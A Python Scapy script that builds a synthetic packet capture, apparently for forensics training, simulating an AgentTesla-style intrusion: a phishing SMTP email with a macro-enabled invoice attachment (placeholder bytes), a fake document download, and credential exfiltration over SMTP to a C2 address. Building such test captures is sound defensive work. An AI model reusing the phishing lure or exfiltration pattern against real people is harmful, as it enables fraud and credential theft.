from scapy.all import *
from datetime import datetime, timedelta
import random
import time
from tcpStuff import tcp_handshake, tcp_ack, tcp_send
from pcapDetails import ip, time
from NoiseFunctions import noiseAddition
# -----------------------------
# Configuration Details (eg start time, IPs, etc)
# -----------------------------
sport_base = random.randint(1024, 60000)

pkts = []

ip = ip()
time = time()

base_time=time.start_attack

def ts(offset):
    return base_time + offset

# -----------------------------
# 1. Phishing Email (SMTP)
# -----------------------------

#TCP Handshake
client_seq, server_seq = tcp_handshake(
    pkts, ts, 0,
    ip.victim_mac, ip.server_mac,
    ip.victim_ip, ip.mail_server_ip,
    sport=1025, dport=25
)


import base64

# Victim details
victim_name = "John Bob"
victim_email = "John.Bob@victim.local"

# ---- Fake DOCM file content (harmless placeholder) ----
# Office files are ZIP containers, so start with PK header
fake_docm = b"PK\x03\x04" + b"\x00" * 500

encoded_docm = base64.b64encode(fake_docm).decode()

boundary = "----=_NextPart_000_001"

smtp_payloads = [
    b"EHLO s3cur3-payments.example\r\n",
    b"MAIL FROM:<billing@s3cur3-payments.example>\r\n",
    f"RCPT TO:<{victim_email}>\r\n".encode(),
    b"DATA\r\n",
    f"""From: Billing Department <billing@s3cur3-payments.example>
To: {victim_name} <{victim_email}>
Subject: Invoice Reminder - Action Required
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="{boundary}"

--{boundary}
Content-Type: text/plain; charset="UTF-8"

Hi {victim_name},

I noticed you haven’t completed payment for Invoice #44721.
Please review the attached invoice document.

Regards,
Jessica Miller
Accounts Receivable

--{boundary}
Content-Type: application/vnd.ms-word.document.macroEnabled.12; name="Invoice_44721.docm"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="Invoice_44721.docm"

{encoded_docm}

--{boundary}--
.\r\n""".encode(),
    b"QUIT\r\n"
]

i = 3 # since start at 3 packets from handshake
for cmd in smtp_payloads:
    client_seq = tcp_send(
        pkts, ts, i,
        ip.victim_mac, ip.server_mac,
        ip.victim_ip, ip.mail_server_ip,
        1025, 25,
        client_seq, server_seq,
        cmd
    )
    i += 1

    tcp_ack(
        pkts, ts, i,
        ip.server_mac, ip.victim_mac,
        ip.mail_server_ip, ip.victim_ip,
        25, 1025,
        server_seq, client_seq
    )
    i += 1

# Downloading payload
http_get = (
    b"GET /download/Invoice_84732.docm HTTP/1.1\r\n"
    b"Host: invoices-secure.example\r\n"
    b"User-Agent: Mozilla/5.0\r\n\r\n"
)

http_response = (
    b"HTTP/1.1 200 OK\r\n"
    b"Content-Type: application/vnd.ms-word.document.macroEnabled.12\r\n"
    b"Content-Length: 40960\r\n\r\n"
    b"PK\x03\x04" + b"\x00" * 200  # Fake Office ZIP header
)

pkt_get = (
    Ether(src=ip.victim_mac, dst=ip.server_mac) /
    IP(src=ip.victim_ip, dst=ip.web_server_ip) /
    TCP(sport=sport_base, dport=80, flags="PA") /
    Raw(load=http_get)
)
pkt_get.time = ts(10)
pkts.append(pkt_get)

pkt_resp = (
    Ether(src=ip.server_mac, dst=ip.victim_mac) /
    IP(src=ip.web_server_ip, dst=ip.victim_ip) /
    TCP(sport=80, dport=sport_base, flags="PA") /
    Raw(load=http_response)
)
pkt_resp.time = ts(11)
pkts.append(pkt_resp)


noiseAddition(pkts)

## Exfiltration
external_ip = ip.c2_ip
gateway_mac = ip.server_mac

export_time = time.exfiltrate

sport = 51515
dport = 25
seq = 1000
ack = 2000


# Packet 1 – SYN
syn = Ether(src=ip.victim_mac, dst=gateway_mac) / \
      IP(src=ip.victim_ip, dst=external_ip) / \
      TCP(sport=sport, dport=dport, flags="S", seq=seq)
syn.time = export_time
pkts.append(syn)

# Packet 2 – SYN-ACK
synack = Ether(src=gateway_mac, dst=ip.victim_mac) / \
         IP(src=external_ip, dst=ip.victim_ip) / \
         TCP(sport=dport, dport=sport, flags="SA", seq=ack, ack=seq+1)
synack.time = export_time + 0.001
pkts.append(synack)

# Packet 3 – Small SMTP DATA chunk (fake test data)
payload = b"EHLO victim\r\nDATA\r\nMicrosoftpassword=J0hnbob123456, outlookpass=123456J0hnbob\r\n.\r\n"

data_pkt = Ether(src=ip.victim_mac, dst=gateway_mac) / \
           IP(src=ip.victim_ip, dst=external_ip) / \
           TCP(sport=sport, dport=dport, flags="PA",
               seq=seq+1, ack=ack+1) / \
           Raw(load=payload)

data_pkt.time = export_time + 0.002
pkts.append(data_pkt)

# Packet 4 – FIN
fin = Ether(src=ip.victim_mac, dst=gateway_mac) / \
      IP(src=ip.victim_ip, dst=external_ip) / \
      TCP(sport=sport, dport=dport, flags="FA",
          seq=seq+1+len(payload), ack=ack+1)
fin.time = export_time + 0.003
pkts.append(fin)

# -----------------------------
# Write PCAP
# -----------------------------
wrpcap("fake_phish_agenttesla.pcap", pkts)

print("PCAP written: fake_phish_agenttesla.pcap")
